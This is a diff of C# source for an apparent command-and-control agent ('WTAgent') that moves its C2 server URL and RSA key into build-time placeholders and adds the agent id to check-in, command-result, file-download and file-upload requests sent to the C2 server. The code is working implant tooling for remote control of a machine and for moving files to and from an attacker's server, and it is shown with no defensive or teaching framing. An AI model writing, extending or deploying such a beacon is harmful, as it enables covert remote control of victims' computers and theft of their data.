@@ -39,8 +39,8 @@ namespace WTAgent
     // =========================================================================
     static class Config
     {
-        // C2 server base URL (no trailing slash)
-        public const string C2_URL        = "https://192.168.101.7:8443";
+        // C2 server base URL (no trailing slash) — set by build.sh, do not edit manually
+        public const string C2_URL        = "__C2_URL__";
 
         // Endpoints
         public const string EP_REGISTER   = "/wta/register";
@@ -49,14 +49,8 @@ namespace WTAgent
         public const string EP_DOWNLOAD   = "/wta/download";
         public const string EP_UPLOAD     = "/wta/upload";
 
-        // RSA public key (PEM, base64 body only — no headers) used to wrap session AES key
-        // Generate with: openssl genrsa 2048 | openssl rsa -pubout
-        // Then paste the base64 body below (one long string, no newlines)
-        public const string SERVER_PUBKEY =
-            "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2a5lC5RZ0P3MsHmjIx8s" +
-            "REPLACEME_REPLACE_WITH_ACTUAL_SERVER_RSA_PUBLIC_KEY_BASE64_HERE_000" +
-            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
-            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIDAQAB";
+        // RSA public key — injected by build.sh, do not edit manually
+        public const string SERVER_PUBKEY = "__SERVER_PUBKEY__";
 
         // Check-in interval (ms) and jitter (±ms)
         public const int SLEEP_BASE       = 5000;
@@ -676,7 +670,7 @@ namespace WTAgent
                 // Heartbeat body: {"id":"...","ts":...}
                 string json = "{\"id\":\"" + _agentId + "\",\"ts\":" + DateTimeOffset.UtcNow.ToUnixTimeSeconds() + "}";
                 byte[] enc  = _crypto.Encrypt(Encoding.UTF8.GetBytes(json));
-                var respBytes = _wc.UploadData(Config.C2_URL + Config.EP_CHECKIN, enc);
+                var respBytes = _wc.UploadData(Config.C2_URL + Config.EP_CHECKIN + "?id=" + _agentId, enc);
                 string respJson = Encoding.UTF8.GetString(_crypto.Decrypt(respBytes)).Trim();
                 return Task.Parse(respJson);
             }
@@ -693,7 +687,7 @@ namespace WTAgent
                     "\",\"b64\":" + (isBase64 ? "true" : "false") +
                     ",\"out\":" + (isBase64 ? "\"" + output + "\"" : JsonStringify(output)) + "}";
                 byte[] enc = _crypto.Encrypt(Encoding.UTF8.GetBytes(json));
-                _wc.UploadData(Config.C2_URL + Config.EP_RESULT, enc);
+                _wc.UploadData(Config.C2_URL + Config.EP_RESULT + "?id=" + _agentId, enc);
                 return true;
             }
             catch { return false; }
@@ -706,7 +700,7 @@ namespace WTAgent
             {
                 string json = "{\"id\":\"" + _agentId + "\",\"file\":\"" + Sanitize(fileName) + "\"}";
                 byte[] enc  = _crypto.Encrypt(Encoding.UTF8.GetBytes(json));
-                var resp    = _wc.UploadData(Config.C2_URL + Config.EP_DOWNLOAD, enc);
+                var resp    = _wc.UploadData(Config.C2_URL + Config.EP_DOWNLOAD + "?id=" + _agentId, enc);
                 return _crypto.Decrypt(resp);
             }
             catch { return null; }
@@ -722,7 +716,7 @@ namespace WTAgent
                     "\",\"file\":\"" + Sanitize(fileName) +
                     "\",\"data\":\"" + Convert.ToBase64String(data) + "\"}";
                 byte[] enc = _crypto.Encrypt(Encoding.UTF8.GetBytes(json));
-                _wc.UploadData(Config.C2_URL + Config.EP_UPLOAD, enc);
+                _wc.UploadData(Config.C2_URL + Config.EP_UPLOAD + "?id=" + _agentId, enc);
                 return true;
             }
             catch { return false; }
